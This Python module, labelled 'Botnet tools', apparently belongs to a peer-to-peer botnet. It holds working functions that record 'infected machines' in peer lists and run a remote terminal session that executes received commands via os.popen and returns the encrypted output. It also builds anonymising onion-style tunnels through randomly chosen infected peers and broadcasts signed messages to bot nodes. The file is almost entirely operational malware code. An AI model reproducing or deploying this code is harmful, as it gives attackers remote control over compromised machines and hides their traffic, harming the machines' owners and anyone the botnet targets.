"""Botnet tools"""

import random
import os
import socket
import copy

from . import (
    MAX_PUBLIC_PEER_LIST_LENGTH,
    logger,
    BUFFER_SIZE,
    ENCODING,
    EXIT,
)
from .security import encrypt
from .message import structure_msg


def add_new_infected_machine(
    msg_data: str, public_peer_list_path: str, private_peer_list_path: str
):
    logger.debug(
        f"Add {msg_data} to {public_peer_list_path} and {private_peer_list_path} files"
    )

    __append_to_file(private_peer_list_path, msg_data)

    if not __public_peer_list_reached_maximum_length(public_peer_list_path):
        __append_to_file(public_peer_list_path, msg_data)
    else:
        __overwrite_random_line_in_file(public_peer_list_path, msg_data)


def __append_to_file(file_: str, data: str):
    logger.debug(f"Append {data} to file {file_}")

    with open(file_, "a") as f:
        f.write(data + "\n")


def __public_peer_list_reached_maximum_length(public_peer_list_path: str) -> bool:
    try:
        with open(public_peer_list_path, "r") as peer_list:
            num_lines = sum(1 for line in peer_list)
    except FileNotFoundError:
        num_lines = 0

    logger.debug(f"File {public_peer_list_path} has {num_lines} lines")

    return num_lines == MAX_PUBLIC_PEER_LIST_LENGTH


def __overwrite_random_line_in_file(file_: str, data: str):
    logger.debug(f"Overwrite a random line in {file_} with {data}")

    line_to_overwrite = random.randint(0, MAX_PUBLIC_PEER_LIST_LENGTH - 1)
    with open(file_, "r") as public_peer_list:
        lines = public_peer_list.readlines()
        lines[line_to_overwrite] = data + "\n"

    with open(file_, "w") as public_peer_list:
        public_peer_list.write("".join(lines))


def terminal_session(client_socket: socket.socket, public_key_path: str):
    logger.debug("Opening terminal session...")

    msg = client_socket.recv(BUFFER_SIZE).decode(ENCODING)
    while msg != EXIT:
        output = __execute_command(msg)
        encrypted_msg = encrypt(output, public_key_path)
        client_socket.send(encrypted_msg)
        msg = client_socket.recv(BUFFER_SIZE).decode(ENCODING)
    client_socket.close()


def __execute_command(command: str) -> str:
    result = os.popen(command).read()
    logger.debug(f"Command executed = {command}")
    logger.debug(f"Command result = {result}")

    return result


def establish_tunnel(
    client_socket: socket.socket, private_peer_list: str, port: int, msg_info: dict
):
    logger.debug("Establishing tunnel")

    num_anonymizers = msg_info["num_anonymizers"]
    onion = msg_info["onion"]

    next_hop_node_address = __get_next_hop(num_anonymizers, private_peer_list, onion)
    updated_msg_info = __update_num_anonymizers(msg_info)
    msg_to_forward = structure_msg(updated_msg_info)

    next_hop = socket.socket()
    next_hop.connect((next_hop_node_address, port))
    next_hop.send(msg_to_forward)

    logger.debug("Tunnel established")
    closed_forward = False
    closed_send_back = False
    while not closed_forward and not closed_send_back:
        closed_forward = __forward(client_socket, next_hop)
        closed_send_back = __send_back(client_socket, next_hop)

    client_socket.close()
    next_hop.close()


def __get_next_hop(num_anonymizers: int, private_peer_list: str, onion: str):
    if num_anonymizers == 1:
        next_hop = onion
    else:
        next_hop = __select_random_neighbour(private_peer_list)

    logger.debug(f"Next hop is {next_hop}")

    return next_hop


def __select_random_neighbour(private_peer_list_path: str) -> str:
    with open(private_peer_list_path, "r") as private_peer_list:
        lines = private_peer_list.readlines()
        num_lines = len(lines)
        random_number = random.randint(0, num_lines - 1)
        text_line = lines[random_number]

    comm_onion = text_line.strip().split(" ")[-1]

    logger.debug(f"Obtained random neighbour {text_line}")
    logger.debug(f"Communication onion being {comm_onion}")

    return comm_onion


def __update_num_anonymizers(msg_info: dict) -> dict:
    msg_info_copy = copy.deepcopy(msg_info)
    msg_info_copy["num_anonymizers"] -= 1

    logger.debug(f"Updated message = {msg_info_copy}")

    return msg_info_copy


def __forward(client_socket: socket.socket, next_hop: socket.socket) -> bool:
    msg = client_socket.recv(BUFFER_SIZE)
    if not msg:
        logger.debug("No more messages to forward, closing tunnel...")
        return True

    logger.debug(f"Forwarding {msg} to next_hop {next_hop}")
    next_hop.send(msg)

    return False


def __send_back(client_socket: socket.socket, next_hop: socket.socket) -> bool:
    response = next_hop.recv(BUFFER_SIZE)
    if not response:
        logger.debug("No more messages to send back, closing tunnel...")
        return True

    logger.debug(f"Sending back response {response} to next_hop {next_hop}")
    client_socket.send(response)

    return False


def close_terminal(socket: socket.socket):
    coded_msg = EXIT.encode(ENCODING)
    socket.send(coded_msg)
    socket.close()

    logger.debug("Terminal closed")


def broadcast(port: int, signed_msg: bytes, nodes: list):
    logger.debug("Broadcasting...")
    for node in nodes:
        logger.debug(f"Sending {signed_msg} to {node}")
        neighbour_socket = socket.socket()
        neighbour_socket.connect((node, port))
        neighbour_socket.send(signed_msg)
        neighbour_socket.close()
